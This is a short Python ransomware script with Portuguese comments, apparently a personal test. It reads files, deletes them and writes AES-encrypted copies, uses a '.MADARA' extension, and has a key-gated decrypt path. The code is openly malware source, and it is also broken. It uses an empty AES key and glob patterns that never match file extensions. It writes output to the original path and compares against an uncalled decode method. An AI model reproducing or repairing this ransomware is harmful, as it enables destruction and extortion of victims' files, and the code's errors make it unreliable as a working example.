import pyaes
import os
import sys

KEY = b"0123456789123456"
EXTS = ["*.txt", "*.jpg"]

def encrypt(file_path):
    with open(file_path, "rb") as file: # Abrindo o arquivo a ser criptografado, ler binário (rb)
        content = file.read() # Lê o conteúdo que foi selecionado

        os.remove(file_path) # Remove o arquivo que foi lido
        aes = pyaes.AESModeOfOperationCTR("")
        encrypted_data = aes.encrypt(content)

        new_file = "{}.MADARA".format(file_path) # Definindo a extensão que terão os arquivos criptografados

    with open(file_path, "wb") as file:
        file.write(encrypted_data)

def decrypt(file_path):
    with open(file_path, "rb") as file: 
        content = file.read()

        os.remove(file_path)
        aes = pyaes.AESModeOfOperationCTR("")
        decrypted_data = aes.encrypt(content)

        new_file = file_path.replace(".MADARA", "")

    with open(file_path, "wb") as file:
        file.write(decrypted_data)

system = os.walk("C:/Users/gabri/Desktop/teste1.jpg")
for root, dirs, files in system:
    for file in files:
        file_path = os.path.join(root, file)
        if len(sys.argv) > 1:
            if sys.argv[1] == KEY.decode and os.path.splitext(file)[1] == ".MADARA":
                decrypt(file_path)
        elif os.path.splitext(file)[1] in EXTS and os.path.basename(__name__) != file: # Verificar se o arquivo tem o mesmo nome do arquivo de criptografia
            print("Criptografado!")
            encrypt(file_path)
